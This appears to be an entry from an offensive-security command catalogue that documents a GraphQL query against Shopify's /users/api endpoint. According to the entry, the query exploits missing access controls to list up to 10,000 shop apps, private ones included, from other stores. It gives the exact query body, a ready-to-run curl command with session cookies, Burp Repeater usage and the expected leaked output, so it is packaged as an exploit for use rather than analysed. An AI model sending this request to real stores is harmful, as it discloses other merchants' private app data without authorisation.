---
id: cmd-shopify-graphql-shopapps-query
data: >-
  {"query":"query xxx { shopApps(first:10000) { edges { node { id isPrivate
  handle name title shopifyApiClientId } } } }"}
tags:
  - graphql
  - query
  - disclosure
type: command
output: JSON response with shopApps data including private apps
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.582Z'
verified: false
validated: true
submitted: true
---
# shopify-graphql-shopapps-query

## Command

This is a GraphQL query body used in an HTTP POST request to Shopify's /users/api endpoint.

```json
{"query":"query xxx { shopApps(first:10000) { edges { node { id isPrivate handle name title shopifyApiClientId } } } }"}
```

## Description

This command crafts a GraphQL query to fetch up to 10,000 shop apps, including private ones, exploiting the lack of access controls. It retrieves key fields for information disclosure. Use in tools like Burp Suite or curl for sending.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| query | Defines the GraphQL operation named 'xxx' | Yes |
| shopApps | Queries the shopApps field | Yes |
| first:10000 | Requests the first 10,000 results | Yes |
| edges { node { ... } } | Navigates pagination to extract fields: id, isPrivate, handle, name, title, shopifyApiClientId | Yes |

## Examples

### Basic Usage

Send via curl:

```bash
curl -X POST https://{ID}.myshopify.com/users/api \
  -H "Content-Type: application/json" \
  -H "Cookie: your-session-cookies" \
  -d '{"query":"query xxx { shopApps(first:10000) { edges { node { id isPrivate handle name title shopifyApiClientId } } } }"}'
```

### Advanced Usage

In Burp Repeater, paste directly into the request body after setting headers.

## Expected Output

A JSON object like {"data":{"shopApps":{"edges":[{"node":{"id":"gid://...","isPrivate":true,"handle":"app-handle",...}}]}}}, containing app details, including private ones from other stores.

## Related

- [[procedures/Intercept-and-Modify-GraphQL-Query]]
